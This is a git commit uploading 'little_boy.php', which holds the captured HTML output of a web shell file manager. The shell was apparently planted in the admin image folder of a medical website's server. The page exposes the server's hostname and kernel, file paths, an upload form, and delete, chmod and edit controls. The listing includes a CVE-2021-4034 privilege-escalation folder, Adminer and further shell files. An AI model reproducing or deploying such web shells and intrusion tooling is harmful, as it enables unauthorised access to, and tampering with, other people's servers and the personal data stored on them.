66d7cc8642dbb366a8919ec4aa409baa98522783
ZenalArifin <39817707+z3n70@users.noreply.github.com>
2022-01-27 10:44:07 +0700

    Add files via upload

---
+++ little_boy.php
@@ -0,0 +1,184 @@
+<b><br><br>Uname : Linux sg3plvwcpnl386809.prod.sin3.secureserver.net 2.6.32-954.3.5.lve1.4.78.el6.x86_64 #1 SMP Thu Mar 26 08:20:27 EDT 2020 x86_64<br></b><!DOCTYPE HTML>
+<HTML>
+<HEAD>
+	<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+<link href="" rel="stylesheet" type="text/css">
+<title>Little_Boy</title>
+<style>
+body{
+color:yellow;
+font-family: "console", cursive;
+background: black;
+text-shadow:0px 0px 1px #ffffff;
+}
+#content tr:hover{
+background-color: url(https://i.ytimg.com/vi/YUDes_czZ3M/maxresdefault.jpg);
+text-shadow:0px 0px 10px #ffffff;
+}
+#content .first{
+background-color: url(https://i.ytimg.com/vi/YUDes_czZ3M/maxresdefault.jpg);
+}
+#content .first:hover{
+background-color: url(https://i.ytimg.com/vi/YUDes_czZ3M/maxresdefault.jpg);
+text-shadow:0px 0px 1px #000000;
+}
+table{
+border: 5px yellow dotted;
+}
+H1{
+font-family: "Rye", cursive;
+}
+a{
+color: #000000;
+text-decoration: none;
+}
+a:hover{
+color: #fff;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 2px #000000 solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+</style>
+</HEAD>
+<BODY>
+<H1><center>Little_Boy</center></H1>
+<body class="  pace-done" bgcolor="Black"><div class="pace  pace-inactive"><div class="pace-progress" data-progress-text="100%" data-progress="99" style="width: 100%;">
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>Current Path : <a href="?path=/">/</a><a href="?path=/home">home</a>/<a href="?path=/home/medical">medical</a>/<a href="?path=/home/medical/public_html">public_html</a>/<a href="?path=/home/medical/public_html/admin">admin</a>/<a href="?path=/home/medical/public_html/admin/img">img</a>/<a href="?path=/home/medical/public_html/admin/img/candidate_identity_proof">candidate_identity_proof</a>/</td></tr><tr><td><form enctype="multipart/form-data" method="POST">
+Upload File : <input type="file" name="file" />
+<input type="submit" value="upload" />
+</form>
+</td></tr></table><br /><center></center><div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Name</center></td>
+<td><center>Size</center></td>
+<td><center>Permissions</center></td>
+<td><center>Options</center></td>
+</tr><tr>
+<td><a href="?path=/home/medical/public_html/admin/img/candidate_identity_proof/CVE-2021-4034">CVE-2021-4034</a></td>
+<td><center>--</center></td>
+<td><center><font color="Blue">drwxr-xr-x</font></center></td>
+<td><center><form method="POST" action="?option&path=/home/medical/public_html/admin/img/candidate_identity_proof">
+<select name="opt">
+<option value=""></option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+</select>
+<input type="hidden" name="type" value="dir">
+<input type="hidden" name="name" value="CVE-2021-4034">
+<input type="hidden" name="path" value="/home/medical/public_html/admin/img/candidate_identity_proof/CVE-2021-4034">
+<input type="submit" value="Oke" />
+</form></center></td>
+</tr><tr class="first"><td></td><td></td><td></td><td></td></tr><tr>
+<td><a href="?filesrc=/home/medical/public_html/admin/img/candidate_identity_proof/adminer-4.8.1.php&path=/home/medical/public_html/admin/img/candidate_identity_proof">adminer-4.8.1.php</a></td>
+<td><center>465.433 KB</center></td>
+<td><center><font color="Blue">-rw-r--r--</font></center></td>
+<td><center><form method="POST" action="?option&path=/home/medical/public_html/admin/img/candidate_identity_proof">
+<select name="opt">
+<option value=""></option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="adminer-4.8.1.php">
+<input type="hidden" name="path" value="/home/medical/public_html/admin/img/candidate_identity_proof/adminer-4.8.1.php">
+<input type="submit" value="Oke" />
+</form></center></td>
+</tr><tr>
+<td><a href="?filesrc=/home/medical/public_html/admin/img/candidate_identity_proof/badge.jpg&path=/home/medical/public_html/admin/img/candidate_identity_proof">badge.jpg</a></td>
+<td><center>237.74 KB</center></td>
+<td><center><font color="Blue">-rw-r--r--</font></center></td>
+<td><center><form method="POST" action="?option&path=/home/medical/public_html/admin/img/candidate_identity_proof">
+<select name="opt">
+<option value=""></option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="badge.jpg">
+<input type="hidden" name="path" value="/home/medical/public_html/admin/img/candidate_identity_proof/badge.jpg">
+<input type="submit" value="Oke" />
+</form></center></td>
+</tr><tr>
+<td><a href="?filesrc=/home/medical/public_html/admin/img/candidate_identity_proof/error_log&path=/home/medical/public_html/admin/img/candidate_identity_proof">error_log</a></td>
+<td><center>0.516 KB</center></td>
+<td><center><font color="Blue">-rw-r--r--</font></center></td>
+<td><center><form method="POST" action="?option&path=/home/medical/public_html/admin/img/candidate_identity_proof">
+<select name="opt">
+<option value=""></option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="error_log">
+<input type="hidden" name="path" value="/home/medical/public_html/admin/img/candidate_identity_proof/error_log">
+<input type="submit" value="Oke" />
+</form></center></td>
+</tr><tr>
+<td><a href="?filesrc=/home/medical/public_html/admin/img/candidate_identity_proof/index.js&path=/home/medical/public_html/admin/img/candidate_identity_proof">index.js</a></td>
+<td><center>1.31 KB</center></td>
+<td><center><font color="Blue">-rw-r--r--</font></center></td>
+<td><center><form method="POST" action="?option&path=/home/medical/public_html/admin/img/candidate_identity_proof">
+<select name="opt">
+<option value=""></option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="index.js">
+<input type="hidden" name="path" value="/home/medical/public_html/admin/img/candidate_identity_proof/index.js">
+<input type="submit" value="Oke" />
+</form></center></td>
+</tr><tr>
+<td><a href="?filesrc=/home/medical/public_html/admin/img/candidate_identity_proof/little_boy.php&path=/home/medical/public_html/admin/img/candidate_identity_proof">little_boy.php</a></td>
+<td><center>8.92 KB</center></td>
+<td><center><font color="Blue">-rw-r--r--</font></center></td>
+<td><center><form method="POST" action="?option&path=/home/medical/public_html/admin/img/candidate_identity_proof">
+<select name="opt">
+<option value=""></option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="little_boy.php">
+<input type="hidden" name="path" value="/home/medical/public_html/admin/img/candidate_identity_proof/little_boy.php">
+<input type="submit" value="Oke" />
+</form></center></td>
+</tr><tr>
+<td><a href="?filesrc=/home/medical/public_html/admin/img/candidate_identity_proof/littleshell.php&path=/home/medical/public_html/admin/img/candidate_identity_proof">littleshell.php</a></td>
+<td><center>12.074 KB</center></td>
+<td><center><font color="Blue">-rw-r--r--</font></center></td>
+<td><center><form method="POST" action="?option&path=/home/medical/public_html/admin/img/candidate_identity_proof">
+<select name="opt">
+<option value=""></option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="littleshell.php">
+<input type="hidden" name="path" value="/home/medical/public_html/admin/img/candidate_identity_proof/littleshell.php">
+<input type="submit" value="Oke" />
+</form></center></td>
+</tr></table>
+</div><center><br />Recoded By Little</font><center>
+</BODY>
+</HTML>
